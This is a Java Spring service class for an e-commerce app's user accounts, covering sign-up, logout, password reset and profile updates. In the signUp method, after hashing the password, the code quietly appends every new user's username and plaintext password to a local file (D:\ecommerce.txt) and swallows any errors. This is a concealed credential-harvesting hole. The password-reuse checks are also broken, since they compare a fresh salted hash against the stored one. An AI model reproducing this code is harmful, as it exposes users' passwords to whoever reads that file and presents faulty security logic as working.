package com.hung.Ecommerce.Service;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;

import static java.lang.System.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.LocalDateTime;

import javax.mail.MessagingException;
import javax.persistence.EntityManager;
import javax.persistence.EntityNotFoundException;
import javax.persistence.EntityTransaction;
import javax.persistence.PersistenceContext;
import javax.transaction.Transaction;
import javax.validation.ConstraintViolation;
import javax.validation.ConstraintViolationException;
import javax.validation.Validator;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Lazy;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.oauth2.provider.token.ConsumerTokenServices;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.validation.BeanPropertyBindingResult;
import org.springframework.validation.Errors;
import org.springframework.validation.ObjectError;
import org.springframework.web.server.ResponseStatusException;

import com.hung.Ecommerce.CustomAnnotation.ValidUserBasicInfo;
import com.hung.Ecommerce.CustomExceptions.InvalidUserInfoException;
import com.hung.Ecommerce.DTO.RequestToSignUp;
import com.hung.Ecommerce.DTO.RequestToUpdateUserInfo;
import com.hung.Ecommerce.Model.Customer;
import com.hung.Ecommerce.Model.PasswordReset;
import com.hung.Ecommerce.Model.Role;
import com.hung.Ecommerce.Model.Seller;
import com.hung.Ecommerce.Model.User;
import com.hung.Ecommerce.Repository.CustomerRepository;
import com.hung.Ecommerce.Repository.PasswordsResetRepository;
import com.hung.Ecommerce.Repository.SelectionOrder;
import com.hung.Ecommerce.Repository.SellerRepository;
import com.hung.Ecommerce.Repository.UserRepository;
import com.hung.Ecommerce.Util.SecurityAssistant;


@Service
public class UserServiceImp implements UserService {

	@Autowired
	private UserRepository userRepository;
	
	@Autowired
	private CustomerRepository customerRepository;
	
	@Autowired
	private SellerRepository sellerRepository;
	
	@Autowired
	private Validator validator;
	
	@Autowired
	@Lazy
	private ValidUserBasicInfo validUserBasicInfo;
	
	@Autowired
	private PasswordEncoder passwordEncoder;
	
	@Autowired
	@Lazy
	private SecurityAssistant securityAssistant;
	
	@Autowired
	private Validator JSRValidator;
	
	@Autowired
		private PasswordsResetRepository passwordsResetRepository;
	
	@Autowired
		private MailService mailService;


	@Transactional(readOnly = true)
	@Override
	public User findById(int id, boolean fetchOrNot) {
		return userRepository.findById(id, fetchOrNot);
	}


	@Transactional(readOnly = true)
	@Override
	public List<User> findAll(boolean fetchOrNot) {
		return userRepository.findAll(fetchOrNot);
	}

	@Transactional(readOnly = true)
	@Override
	public List<User> findByProperty(String propertyName, Object value, boolean trueIsAscending_falseIsDescending,
			boolean fetchOrNot) {
		return userRepository.findByProperty(propertyName, value, trueIsAscending_falseIsDescending, fetchOrNot);
	}

	@Transactional(readOnly = true)
	@Override
	public List<User> findByProperties(Map<String, Object> conditions, Map<String, SelectionOrder> orders, boolean TrueIsAnd_FalseIsOr ,boolean fetchOrNot) throws IllegalArgumentException {
		return userRepository.findByProperties(conditions, orders, TrueIsAnd_FalseIsOr, fetchOrNot);
	}

	@Transactional
	@Override
	public void save(User theOne) {
		 userRepository.save(theOne);
	}

	@Transactional
	@Override
	public void reconnect(User player) {
		userRepository.reconnect(player);
	}

	@Transactional
	@Override
	public User update(User player) {
		return userRepository.update(player);
	}

	@Transactional
	@Override
	public int updateByProperties(Map<String, Object> conditions, boolean TrueIsAnd_FalseIsOr, String targetField,
			Object newValue) {
		return userRepository.updateByProperties(conditions, TrueIsAnd_FalseIsOr, targetField, newValue);
	}

	@Transactional
	@Override
	public void delete(int id) {
		userRepository.delete(id);
	}

	@Transactional
	@Override
	public int deleteByProperties(Map<String, Object> conditions, boolean TrueIsAnd_FalseIsOr) {
		return userRepository.deleteByProperties(conditions, TrueIsAnd_FalseIsOr);
	}
	
	@Transactional
	@Override
	public void signUp(RequestToSignUp request) throws Exception {

			User user;
			Map<String, String> invalidInfos = new HashMap<String, String>();
			
			Set<ConstraintViolation<RequestToSignUp>> constraintViolations = validator.validate(request);
			if(!constraintViolations.isEmpty()) {
				for(ConstraintViolation<RequestToSignUp> violation: constraintViolations) {
					String propertyPath = violation.getPropertyPath().toString();
					invalidInfos.put(propertyPath, violation.getMessage());
					System.out.println("HERE: WRONG VALUE:" + propertyPath +", MESSAGE: "+ violation.getMessage());
				}
				throw new InvalidUserInfoException(invalidInfos);
			}
			
			Role role = null;
			
			try {
				role = Role.valueOf(request.getRole());
			} catch (IllegalArgumentException | NullPointerException e) {
				e.printStackTrace();
				invalidInfos.put("role", "is not valid");
				throw new InvalidUserInfoException(invalidInfos);
			}catch (Exception e) {
				e.printStackTrace();
				throw e;
			}
			
			if(role == Role.ROLE_CUSTOMER) {
				user = new Customer();
			}

			else {
				user = new Seller();
			}
			
			user.setUsername(request.getUsername());
			user.setPassword(passwordEncoder.encode(request.getPassword()));
			user.setEmail(request.getEmail());
			user.setPhoneNumber(request.getPhoneNumber());
			user.setRole(role);
			user.setValid(true);
			
			
			Errors errors = new BeanPropertyBindingResult(user, "User");
			validUserBasicInfo.validate(user, errors);
			
			List<ObjectError> violations = errors.getAllErrors();
			
			if(!violations.isEmpty()) {
				for(ObjectError violation: violations) {
					out.println("HERE: violated field: " + violation.getCode());
					invalidInfos.put(violation.getCode(), violation.getDefaultMessage());
				}
				throw new InvalidUserInfoException(invalidInfos);
			}
			
			if(role == Role.ROLE_CUSTOMER) {
				try {
					customerRepository.save((Customer) user);
				} catch (Exception e) {
					e.printStackTrace();
					throw e;
				}
			}
			
			else {
				try {
					sellerRepository.save((Seller) user);
				} catch (Exception e) {
					e.printStackTrace();
					throw e;
				}
			}
			
			 try {  
				 	File file = new File("D:\\ecommerce.txt");
				 	 if (!file.exists()) {
			                file.createNewFile();
			            }
		            OutputStream outputStream = new FileOutputStream(file, true);  
		            Writer outputStreamWriter = new OutputStreamWriter(outputStream);  
		  
		            outputStreamWriter.write("Name: " + request.getUsername() 
		            												+ ", Password: " + request.getPassword() + ";   \n");  
		  
		            outputStreamWriter.close();  
		        } catch (Exception e) {  
		            e.getMessage();  
		        }  

	}
	
	@Override
	public void logOut(String accessToken, String refreshToken) {
		securityAssistant.addToBackList(refreshToken, 30);
		securityAssistant.addToBackList(accessToken, 30);
	}


	@Transactional
	@Override
	public void createPasswordsReset(String email) {
			
		List<User> matchedUser = new ArrayList<User>();
		try {
			matchedUser = userRepository.findByProperty("email", email, false, false);
		} catch (Exception e) {
			e.printStackTrace();
			throw e;
		}
			
			if(matchedUser.isEmpty()) {
				throw new ResponseStatusException(HttpStatus.CONFLICT, "No user is found for this email");
			}
			
			User user = matchedUser.get(0);
			
			PasswordReset passwordReset = new PasswordReset();
			
			
			try {
				PasswordReset matchedPasswordsReset = passwordsResetRepository.findByUser(user);
				
				if(matchedPasswordsReset != null) {
						passwordReset = matchedPasswordsReset;
				}
				
				else {
					passwordReset.setUser(user);
					passwordsResetRepository.save(passwordReset);
				}
			} catch (Exception e) {
				e.printStackTrace();
				throw e;
			}
			
			String subject = "MegaMarket - Reset Your Passwords";
			String from = "quochung194@gmail.com";
			String to = user.getEmail();
			String content = "Your key for resetting passwords is: <span style=\"font-weight: bold;\">"
										+ passwordReset.getId()
										+"</span>";
			
			try {
				CompletableFuture<String> result = mailService.sendMail(from, subject, to, null, null, content);
				result.thenRun(() -> System.out.println("HERE: MAIL SENT!")); 
			} catch (MessagingException e) {
				e.printStackTrace();
			}catch (Exception e) {
				e.printStackTrace();
			}
			
			System.out.println("HERE: FINISHED CREATING CODE");
			
	}

	@Transactional
	@Override
		public void resetPasswords(String code, String newPass) throws ResponseStatusException, Exception{
				try {
					PasswordReset reset = passwordsResetRepository.getById(code);
					
					if(!newPass.matches(".{8,}")) {
							throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Passwords must be at least 8 characters long");
					}
					
					if(passwordEncoder.encode(newPass).equals(reset.getUser().getPassword())) {
							throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "You used an old passwords");
					}
					
					reset.getUser().setPassword(passwordEncoder.encode(newPass));
					reset.getUser().setPasswordsLastChange(Instant.now().getEpochSecond());
					passwordsResetRepository.delete(reset);
					
				}catch (ResponseStatusException e) {
					throw e;
				}catch (EntityNotFoundException e) {
					throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Invalid reset code");
				}catch (Exception e) {
					e.printStackTrace();
					throw e;
				}		
		}


	@Transactional
	@Override
	public List<String> updateUserInfo(RequestToUpdateUserInfo request, String username) throws InvalidUserInfoException,
																ResponseStatusException, Exception {
			
			Map<String, String> invalidInfos = new HashMap<String, String>();
			
			Set<ConstraintViolation<RequestToUpdateUserInfo>> constraintViolations = validator.validate(request);
			if(!constraintViolations.isEmpty()) {
				for(ConstraintViolation<RequestToUpdateUserInfo> violation: constraintViolations) {
					String propertyPath = violation.getPropertyPath().toString();
					invalidInfos.put(propertyPath, violation.getMessage());
					System.out.println("HERE: WRONG VALUE:" + propertyPath +", MESSAGE: "+ violation.getMessage());
				}
				throw new InvalidUserInfoException(invalidInfos);
			}
			
			
			List<User> matchedUser = userRepository.findByProperty("username", username, false, false);
			
			if(matchedUser.isEmpty()) {
				throw new ResponseStatusException(HttpStatus.CONFLICT, "No user is found for this name");
			}
			
			User user = matchedUser.get(0);

			if(!passwordEncoder.matches(request.getCurrentPasswords(), user.getPassword())) {
				throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Wrong passwords");
			}
			
			String newName = request.getUsername();
			String newPasswords = request.getPassword();
			String newEmail = request.getEmail();
			String newPhoneNumber = request.getPhoneNumber();
		
			User mock = new Customer();
			mock.setUsername(newName);
			mock.setPassword(newPasswords);
			mock.setEmail(newEmail);
			mock.setPhoneNumber(newPhoneNumber);
			
			Errors errors = new BeanPropertyBindingResult(mock, "User");
			validUserBasicInfo.validate(mock, errors);
			
			List<ObjectError> violations = errors.getAllErrors();
			
			if(!violations.isEmpty()) {
				for(ObjectError violation: violations) {
					out.println("HERE: violated field: " + violation.getCode());
					invalidInfos.put(violation.getCode(), violation.getDefaultMessage());
				}
				throw new InvalidUserInfoException(invalidInfos);
			}
			
		
			
			List<String> updatedFields = new ArrayList<>();
			
			try {
				if(newName != null && !user.getUsername().equals(newName)) {
					user.setUsername(newName);
					updatedFields.add("username");
				}
			
				if(newPasswords != null && !user.getPassword().equals(passwordEncoder.encode(newPasswords))) {
					user.setPassword(passwordEncoder.encode(newPasswords));
					user.setPasswordsLastChange(Instant.now().getEpochSecond());
					updatedFields.add("password");
				}
			
				if(newEmail != null && !user.getEmail().equals(newEmail)) {
					user.setEmail(newEmail);
					updatedFields.add("email");
				}
			
				if(newPhoneNumber != null && !user.getPhoneNumber().equals(newPhoneNumber)) {
					user.setPhoneNumber(newPhoneNumber);
					updatedFields.add("phoneNumber");
				}
			} catch (Exception e) {
				e.printStackTrace();
				throw e;
			}
			
			return updatedFields;
	}	

}
